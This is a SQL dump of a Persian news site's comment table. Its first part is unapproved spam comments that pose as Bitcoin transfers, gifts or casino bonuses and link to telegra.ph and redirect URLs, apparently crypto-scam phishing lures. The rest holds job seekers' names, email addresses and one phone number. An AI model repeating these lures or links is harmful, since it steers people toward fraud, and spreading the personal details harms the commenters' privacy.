INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88395, 60240, '📜 Ticket; Transaction №TV46. RECEIVE => out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvbnZlcnNhdGlv', 'jmehoff@gmailod.com', 'e4e034', 0, '2024-12-16 02:19:29', '1403/9/26', '2:19:29 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88396, 60249, '🗝 You have received 1 email № 451. Open >>> out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvbnZlcnNh', 'jmehoff@gmailod.com', 'jdd4jh', 0, '2024-12-16 02:19:31', '1403/9/26', '2:19:31 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88397, 60250, '🔏 Ticket: Operation 1,8298 BTC. Assure > out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvbnZlcnNhdGl', 'jmehoff@gmailod.com', 'atb5v6', 0, '2024-12-16 02:19:33', '1403/9/26', '2:19:33 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88398, 60252, '📬 Email; SENDING 1.82 bitcoin. Get => out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvbnZlcnNhdGlvbj', 'jmehoff@gmailod.com', 'bvnka2', 0, '2024-12-16 02:19:35', '1403/9/26', '2:19:35 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88399, 60253, '📮 Ticket- Withdrawing №CQ58. CONFIRM =>> out.carrotquest-mail.io/r?hash=YXBwPTY0MDcyJmNvbnZlcnNhdGl', 'jmehoff@gmailod.com', 'p98fm4', 0, '2024-12-16 02:19:37', '1403/9/26', '2:19:37 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88400, 60240, '📍 Reminder; Withdrawing NoAS45. RECEIVE => https://telegra.ph/Ticket--9515-12-16?hs=72f40802f2434bb', 'hatty2001@murahpanel.com', 'uz00mq', 0, '2024-12-22 09:18:21', '1403/10/2', '9:18:21 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88401, 60250, '🗒 Notification- TRANSFER 1,8216 BTC. Withdraw =>> https://telegra.ph/Ticket--9515-12-16?hs=0e0fd73c', 'hatty2001@murahpanel.com', 'tny3az', 0, '2024-12-22 09:18:31', '1403/10/2', '9:18:31 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88403, 60253, '🔑 Notification- Operation 1,8298 BTC. Confirm >> https://telegra.ph/Ticket--9515-12-16?hs=d0c06fd37', 'hatty2001@murahpanel.com', 'wm5t6f', 0, '2024-12-22 09:18:54', '1403/10/2', '9:18:54 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88404, 60254, '🔑 We send a transaction from unknown user. Get > https://telegra.ph/Ticket--9515-12-16?hs=9421cb524', 'hatty2001@murahpanel.com', '6b74vx', 0, '2024-12-22 09:19:26', '1403/10/2', '9:19:26 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88405, 60240, '🔌 Ticket- TRANSFER 1.8248463 bitcoin. Next >> https://telegra.ph/Message--2868-12-25?hs=72f40802f24', 'friedenspfeifen@omggreatfoods.com', '2b3iet', 0, '2025-01-01 04:36:14', '1403/10/12', '4:36:14 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88406, 60256, '🖇 You have a transaction from Binance. Get >> https://telegra.ph/Message--2868-12-25?hs=264319e0c12', 'friedenspfeifen@omggreatfoods.com', 'jjhxmo', 0, '2025-01-01 04:36:17', '1403/10/12', '4:36:17 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88407, 60257, '📆 You got a transfer from our company. Verify >> https://telegra.ph/Message--2868-12-25?hs=c974bca2', 'friedenspfeifen@omggreatfoods.com', 'y5z2h9', 0, '2025-01-01 04:36:20', '1403/10/12', '4:36:20 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88408, 60258, '🔓 Email- Process #ND68. CONFIRM => https://telegra.ph/Message--2868-12-25?hs=4c397dc4fc0ec9d17af528', 'friedenspfeifen@omggreatfoods.com', 'wg8bhy', 0, '2025-01-01 04:36:23', '1403/10/12', '4:36:23 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88409, 60259, '🔋 You have received 1 message # 668. Open - https://telegra.ph/Message--2868-12-25?hs=581786db6d96d', 'friedenspfeifen@omggreatfoods.com', '967ytj', 0, '2025-01-01 04:36:31', '1403/10/12', '4:36:31 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88410, 60240, '📆 You have a transaction from our company. Receive => https://telegra.ph/Message--2868-12-25?hs=72f', 'azizxkill1@setxko.com', 'w8lol6', 0, '2025-01-02 05:59:21', '1403/10/13', '5:59:21 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88411, 60256, '📮 Notification: Operation #UN69. Go to withdrawal => https://telegra.ph/Message--2868-12-25?hs=2643', 'azizxkill1@setxko.com', 'otpftk', 0, '2025-01-02 05:59:24', '1403/10/13', '5:59:24 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88412, 60257, '📀 Message- Transfer NoTC16. Go to withdrawal >>> https://telegra.ph/Message--2868-12-25?hs=c974bca2', 'azizxkill1@setxko.com', '6mppsl', 0, '2025-01-02 05:59:27', '1403/10/13', '5:59:27 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88413, 60258, '🖥 Email: Transfer #QL43. GET => https://telegra.ph/Message--2868-12-25?hs=4c397dc4fc0ec9d17af52828e', 'azizxkill1@setxko.com', 'v09nnx', 0, '2025-01-02 05:59:30', '1403/10/13', '5:59:30 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88414, 60259, '🔒 We send a transfer from unknown user. GET > https://telegra.ph/Message--2868-12-25?hs=581786db6d9', 'azizxkill1@setxko.com', 'qlg932', 0, '2025-01-02 05:59:33', '1403/10/13', '5:59:33 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88415, 60264, '📉 You have 1 notification # 712891. Go >> https://telegra.ph/Ticket--6974-01-15?hs=01f378c34cee7855', 'stevescan@24hinbox.com', 'vftz1z', 0, '2025-01-16 22:05:10', '1403/10/27', '10:05:10 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88416, 60265, '🛠 We send a gift from user. Next => https://telegra.ph/Ticket--6974-01-15?hs=5188495da7647a73649b3a', 'stevescan@24hinbox.com', '18fgdr', 0, '2025-01-16 22:05:13', '1403/10/27', '10:05:13 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88417, 60266, '📐 + 0.75569083 BTC.NEXT - https://telegra.ph/Ticket--6974-01-15?hs=e5837da997357557d64ab13c047cf59b', 'stevescan@24hinbox.com', 'kgpno4', 0, '2025-01-16 22:05:15', '1403/10/27', '10:05:15 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88418, 60267, '📲 We send a gift from user. Verify =>> https://telegra.ph/Ticket--6974-01-15?hs=0538ec91b86085dfba1', 'stevescan@24hinbox.com', '2e952t', 0, '2025-01-16 22:05:18', '1403/10/27', '10:05:18 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88419, 60264, '🔍 We send a gift from our company. Confirm >> https://telegra.ph/Get-BTC-right-now-01-22?hs=01f378c', 'stevescan@24hinbox.com', 'ssiqlh', 0, '2025-01-23 22:23:21', '1403/11/4', '10:23:21 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88420, 60265, '📕 Sending a gift from us. GЕТ => https://telegra.ph/Get-BTC-right-now-01-22?hs=5188495da7647a73649b', 'stevescan@24hinbox.com', 'erpfqq', 0, '2025-01-23 22:23:23', '1403/11/4', '10:23:23 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88421, 60266, '📔 Message; Operation NoSX99. CONTINUE >>> https://telegra.ph/Get-BTC-right-now-01-22?hs=e5837da9973', 'stevescan@24hinbox.com', 's7z2c1', 0, '2025-01-23 22:23:25', '1403/11/4', '10:23:25 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88423, 61267, '📒 Email- TRANSACTION 0,75680914 bitcoin. Continue =>> https://telegra.ph/Get-BTC-right-now-01-22?hs', 'txahole@eewmaop.com', 'kafubm', 0, '2025-01-31 07:03:31', '1403/11/12', '7:03:31 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88424, 61268, '🔓 + 0.75757906 BTC.NEXT - https://telegra.ph/Get-BTC-right-now-01-22?hs=6f9b66713df0eae1e5dfbb32356', 'txahole@eewmaop.com', '1mx0rq', 0, '2025-01-31 07:03:48', '1403/11/12', '7:03:48 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88425, 61269, '📦 Reminder; You got a transfer NoZS04. ASSURE > https://telegra.ph/Get-BTC-right-now-01-22?hs=82d37', 'txahole@eewmaop.com', 'ehkqef', 0, '2025-01-31 07:04:01', '1403/11/12', '7:04:01 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88426, 61270, '📏 Sending a transaction from user. Get =>> https://telegra.ph/Get-BTC-right-now-01-22?hs=b68ef763da', 'txahole@eewmaop.com', '3potb4', 0, '2025-01-31 07:04:03', '1403/11/12', '7:04:03 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88427, 61267, '🔑 Reminder- + 0,75784301 BTC. Receive > https://telegra.ph/Get-BTC-right-now-01-22?hs=97dcc26cc9b95', 'hatty2001@murahpanel.com', '2di54f', 0, '2025-02-03 05:46:53', '1403/11/15', '5:46:53 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88428, 61268, '🗒 Reminder- TRANSFER 0.75937513 BTC. Withdraw => https://telegra.ph/Get-BTC-right-now-01-22?hs=6f9b', 'hatty2001@murahpanel.com', 'ons7s2', 0, '2025-02-03 05:46:57', '1403/11/15', '5:46:57 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88429, 61269, '📈 You have 1 notification # 934611. Read - https://telegra.ph/Get-BTC-right-now-01-22?hs=82d37cd3b0', 'hatty2001@murahpanel.com', '608a1f', 0, '2025-02-03 05:47:02', '1403/11/15', '5:47:02 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88430, 61270, '📖 You have received a email # 818023. Read >>> https://telegra.ph/Get-BTC-right-now-01-22?hs=b68ef7', 'hatty2001@murahpanel.com', 'xaa84p', 0, '2025-02-03 05:47:07', '1403/11/15', '5:47:07 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88431, 61269, '📌 + 0.7533078 BTC.NEXT - https://telegra.ph/Get-BTC-right-now-01-22?hs=82d37cd3b0102c41245c4aafc612', 'roofa2000@automisly.org', 't144fn', 0, '2025-02-06 14:36:52', '1403/11/18', '2:36:52 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88432, 61270, '📗 + 0.7573866 BTC.NEXT - https://telegra.ph/Get-BTC-right-now-01-22?hs=b68ef763da8413af32bc496eba68', 'roofa2000@automisly.org', 's2udc7', 0, '2025-02-06 14:36:55', '1403/11/18', '2:36:55 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88433, 62269, '🛎 You have received 1 message № 582877. Go >> https://telegra.ph/Get-BTC-right-now-01-22?hs=bcf365b', 'roofa2000@automisly.org', 'ep22o0', 0, '2025-02-06 14:36:58', '1403/11/18', '2:36:58 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88434, 62270, '📆 Sending a transfer from us. GЕТ >>> https://telegra.ph/Get-BTC-right-now-01-22?hs=7591b2b6024e1f3', 'roofa2000@automisly.org', 'ha647b', 0, '2025-02-06 14:37:01', '1403/11/18', '2:37:01 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88435, 61269, '🛠 + 0.75866951 BTC.GET - https://telegra.ph/Get-BTC-right-now-01-22?hs=82d37cd3b0102c41245c4aafc612', 'romnik2012@code-gmail.com', 'mgt5gs', 0, '2025-02-07 11:44:24', '1403/11/19', '11:44:24 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88436, 61270, '💿 You have a transaction from us. GЕТ > https://telegra.ph/Get-BTC-right-now-01-22?hs=b68ef763da841', 'romnik2012@code-gmail.com', '6hi8qa', 0, '2025-02-07 11:44:26', '1403/11/19', '11:44:26 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88437, 62269, '🔒 + 0.75770881 BTC.NEXT - https://telegra.ph/Get-BTC-right-now-01-22?hs=bcf365b7ccbdd05d74d1675fbcb', 'romnik2012@code-gmail.com', 'c36dq3', 0, '2025-02-07 11:44:28', '1403/11/19', '11:44:28 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88438, 62270, '🔓 You got a transfer from unknown user. Take >> https://telegra.ph/Get-BTC-right-now-01-22?hs=7591b', 'romnik2012@code-gmail.com', '85duya', 0, '2025-02-07 11:44:40', '1403/11/19', '11:44:40 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88439, 61270, '🟢 6000$ + 200 FREE SPINS. GET -> https://telegra.ph/6000--200-FREE-SPINS-02-05?hs=b68ef763da8413af3', 'vivzgnoras@email-temp.com', 'yir6fh', 0, '2025-02-08 09:03:34', '1403/11/20', '9:03:34 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88440, 62269, '🔆 6000$ + 200 FREE SPINS. GET >>> https://telegra.ph/6000--200-FREE-SPINS-02-05?hs=bcf365b7ccbdd05d', 'vivzgnoras@email-temp.com', 'c9xquq', 0, '2025-02-08 09:03:36', '1403/11/20', '9:03:36 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88441, 62270, '🔶 6000$ + 200 FREE SPINS. GET > https://telegra.ph/6000--200-FREE-SPINS-02-05?hs=7591b2b6024e1f3841', 'vivzgnoras@email-temp.com', 'xo508y', 0, '2025-02-08 09:03:38', '1403/11/20', '9:03:38 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88442, 62271, '🔶 6000$ + 200 FREE SPINS. GET -> https://telegra.ph/6000--200-FREE-SPINS-02-05?hs=b873c458f79c9e79e', 'vivzgnoras@email-temp.com', 'lx1f92', 0, '2025-02-08 09:03:41', '1403/11/20', '9:03:41 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88443, 61270, '🔑 Notification: TRANSFER 0.75396957 BTC. Verify >> https://telegra.ph/Get-BTC-right-now-01-22?hs=b6', 'andreiutenkov@twitch.work', 'h0wevt', 0, '2025-02-08 22:51:11', '1403/11/20', '10:51:11 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88444, 62269, '🔓 Ticket- Process NoDV64. GET >> https://telegra.ph/Get-BTC-right-now-01-22?hs=bcf365b7ccbdd05d74d1', 'andreiutenkov@twitch.work', 'hi586o', 0, '2025-02-08 22:51:14', '1403/11/20', '10:51:14 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88445, 62270, '📈 Reminder- Transaction №KI34. CONTINUE >> https://telegra.ph/Get-BTC-right-now-01-22?hs=7591b2b602', 'andreiutenkov@twitch.work', 'sy5uhn', 0, '2025-02-08 22:51:16', '1403/11/20', '10:51:16 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88446, 62271, '📌 You got a transfer from us. Gо tо withdrаwаl >>> https://telegra.ph/Get-BTC-right-now-01-22?hs=b8', 'andreiutenkov@twitch.work', 'zufqsm', 0, '2025-02-08 22:51:18', '1403/11/20', '10:51:18 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88447, 62271, 'میلاد بهرامی', 'bmilad144@gmail.com', 'سلام گفته بودن برای نگهبانی هم نیرو میخواد کرمانشاه ولی هیچی در موردش اینجا نگفتن ', 0, '2025-02-16 09:44:49', '1403/11/28', '9:44:49 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88448, 62272, 'مبین نیلوفری', 'mobinnilofari1380@gmail.com', 'در شغل  نگهبانی آماده به خدمتم', 0, '2025-02-16 18:32:37', '1403/11/28', '6:32:37 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88449, 62272, 'بهمن مرادی', 'bistoon.moradi@gmail.com', 'جذب نیرو', 0, '2025-02-16 19:01:25', '1403/11/28', '7:01:25 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88450, 62275, 'omidmahmodi5225@gmail.com', 'omidmahmodi5225@gmail.com', 'استخدامی', 0, '2025-02-17 09:27:04', '1403/11/29', '9:27:04 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88451, 62277, 'زهراآغاجری', 'zhraaghajry405@gmail.com', 'خدمات', 0, '2025-02-17 15:37:53', '1403/11/29', '3:37:53 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88452, 62277, 'زهراآغاجری', 'zhraaghajry405@gmail.com', 'خدمات', 0, '2025-02-17 15:38:46', '1403/11/29', '3:38:46 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88453, 62277, 'زهراآغاجری', 'zhraaghajry405@gmail.com', 'خدمات', 0, '2025-02-17 15:38:46', '1403/11/29', '3:38:46 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88454, 62272, 'رسول نوروزی', 'r.n.6413049@gmail.com', 'شرکت درازمون', 0, '2025-02-17 16:36:43', '1403/11/29', '4:36:43 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88455, 62276, 'علی اعصامی', 'aliasami667@gmail.com', 'راننده لودر', 0, '2025-02-17 18:53:27', '1403/11/29', '6:53:27 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88456, 62276, 'علی اعصامی', 'aliasami667@gmail.com', 'راننده لودر', 0, '2025-02-17 18:53:28', '1403/11/29', '6:53:28 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88457, 62276, 'محمد احمدی', 'mamadahmadii605@gmail.com', '
سیمبان', 0, '2025-02-17 21:55:33', '1403/11/29', '9:55:33 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88458, 62276, 'ابراهیم آریایی پور', 'borhan.mazrah1374@gmail.com', 'اهواز.سوسنگرد', 0, '2025-02-18 11:53:02', '1403/11/30', '11:53:02 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88459, 62276, 'ابراهیم آریایی پور', 'borhan.mazrah1374@gmail.com', 'اهواز.سوسنگرد', 0, '2025-02-18 11:53:28', '1403/11/30', '11:53:28 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88460, 62276, 'ابراهیم آریایی پور', 'borhan.mazrah1374@gmail.com', 'اهواز.سوسنگرد', 0, '2025-02-18 11:53:29', '1403/11/30', '11:53:29 AM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88461, 51185, 'Mohammadkhorasani', 'mehmetkhlela1@gmail.com', 'محمدخراسانی هستم دیپلم تجربی چطورمیتوتم ثبت نام کنم', 0, '2025-02-18 14:06:35', '1403/11/30', '2:06:35 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88462, 51185, 'Mohammadkhorasani', 'mehmetkhlela1@gmail.com', 'محمدخراسانی هستم دیپلم تجربی چطورمیتوتم ثبت نام کنم', 0, '2025-02-18 14:06:44', '1403/11/30', '2:06:44 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88463, 62276, 'سجاد نجف زاده', 'Sajadnajafzade@gmail.com', 'بنده مامور قرائت با مدرک فوق دیپلم 
با پیمانکار بخش خصوصی شهرستان شوشتر  هستم 
بسیار خوشحالم از این بابت ک قراره آزمون برگذار بشه که بتونیم جذب اداره بشیم', 0, '2025-02-18 14:41:55', '1403/11/30', '2:41:55 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88464, 62276, 'سجاد نجف زاده', 'Sajadnajafzade@gmail.com', 'بنده مامور قرائت با مدرک فوق دیپلم 
با پیمانکار بخش خصوصی شهرستان شوشتر  هستم 
بسیار خوشحالم از این بابت ک قراره آزمون برگذار بشه که بتونیم جذب اداره بشیم', 0, '2025-02-18 14:41:56', '1403/11/30', '2:41:56 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88465, 62276, 'سجاد نجف زاده', 'Sajadnajafzade@gmail.com', 'بنده مامور قرائت با مدرک فوق دیپلم 
با پیمانکار بخش خصوصی شهرستان شوشتر  هستم 
بسیار خوشحالم از این بابت ک قراره آزمون برگذار بشه که بتونیم جذب اداره بشیم', 0, '2025-02-18 14:41:58', '1403/11/30', '2:41:58 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88466, 51185, 'حمیدرضا ملائی', 'Hamidrezamolaei1372@gmail.com', 'فوق دیپلم', 0, '2025-02-18 14:58:01', '1403/11/30', '2:58:01 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88467, 51185, 'امین حویزه رمضانی', 'shahab.ghavabesh10@gmil.com', 'باسلام خسته نباشد بنده امین حویزه رمضانی ۳۵ سالمه مدرک دیپلم  راننده پایه یکم کارت هوشمند فعال', 0, '2025-02-18 18:48:21', '1403/11/30', '6:48:21 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88468, 51185, 'امین حویزه رمضانی', 'shahab.ghavabesh10@gmil.com', 'باسلام خسته نباشد بنده امین حویزه رمضانی ۳۵ سالمه مدرک دیپلم  راننده پایه یکم کارت هوشمند فعال', 0, '2025-02-18 18:48:35', '1403/11/30', '6:48:35 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88469, 51185, 'امین حویزه رمضانی', 'shahab.ghavabesh10@gmil.com', 'باسلام خسته نباشد بنده امین حویزه رمضانی ۳۵ سالمه مدرک دیپلم  راننده پایه یکم کارت هوشمند   فعال.   شماره تلیفن ۰۹۳۹۹۳۱۳۹۰۸', 0, '2025-02-18 18:49:36', '1403/11/30', '6:49:36 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88470, 62276, 'سیدمهدی موسوی', 'mehdialneameh1381@Email.com', 'کار', 0, '2025-02-18 19:17:38', '1403/11/30', '7:17:38 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88471, 62276, 'سیدمهدی موسوی', 'mehdialneameh1381@Email.com', 'کار', 0, '2025-02-18 19:17:45', '1403/11/30', '7:17:45 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88472, 60238, 'حسام', 'hesamharizavi8@gmail.com', 'جهت استخام', 0, '2025-02-18 20:57:40', '1403/11/30', '8:57:40 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88473, 60238, 'حسام', 'hesamharizavi8@gmail.com', 'جهت استخدام', 0, '2025-02-18 20:57:45', '1403/11/30', '8:57:45 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88474, 62276, 'جعفر بوعذار', 'danyalawy32@gmail.com', 'براي استخدام', 0, '2025-02-18 21:21:30', '1403/11/30', '9:21:30 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88475, 62276, 'جعفر بوعذار', 'danyalawy32@gmail.com', 'براي استخدام', 0, '2025-02-18 21:23:47', '1403/11/30', '9:23:47 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88476, 62276, 'جعفر بوعذار', 'danyalawy32@gmail.com', 'براي استخدام', 0, '2025-02-18 21:23:48', '1403/11/30', '9:23:48 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88477, 62276, 'جعفر بوعذار', 'danyalawy32@gmail.com', 'براي استخدام', 0, '2025-02-18 21:23:49', '1403/11/30', '9:23:49 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88478, 51185, 'جلیل ظاهری', 'jlylzahry68@gmail.com', 'پنچم ابتدایی تنضیفات', 0, '2025-02-19 20:35:45', '1403/12/1', '8:35:45 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88479, 51185, 'جلیل ظاهری', 'jlylzahry68@gmail.com', 'پنچم ابتدایی تنضیفات', 0, '2025-02-19 20:35:47', '1403/12/1', '8:35:47 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88480, 51185, 'جلیل ظاهری', 'jlylzahry68@gmail.com', 'پنچم ابتدایی تنضیفات', 0, '2025-02-19 20:35:47', '1403/12/1', '8:35:47 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88481, 51185, 'جلیل ظاهری', 'jlylzahry68@gmail.com', 'پنچم ابتدایی تنضیفات', 0, '2025-02-19 20:35:48', '1403/12/1', '8:35:48 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88482, 62277, 'فاطمه دغاغله', 'Fatmhdghaghlh42@gmail.com', 'ثبت نام ', 0, '2025-02-19 21:43:52', '1403/12/1', '9:43:52 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88483, 62277, 'حسن عبیداوی', 'obeidavi2016@gmail.com', 'ثبت نام دارایی مدرک تحصیلی دیپلم ', 0, '2025-02-19 21:46:46', '1403/12/1', '9:46:46 PM');
INSERT INTO kw_news_comments (id, news_id, name, email, message, approved, comment_date, shamsi_date, shamsi_time) VALUES (88484, 62277, 'حسن عبیداوی', 'obeidavi2016@gmail.com', 'ثبت نام دارایی مدرک تحصیلی دیپلم ', 0, '2025-02-19 21:46:47', '1403/12/1', '9:46:47 PM');
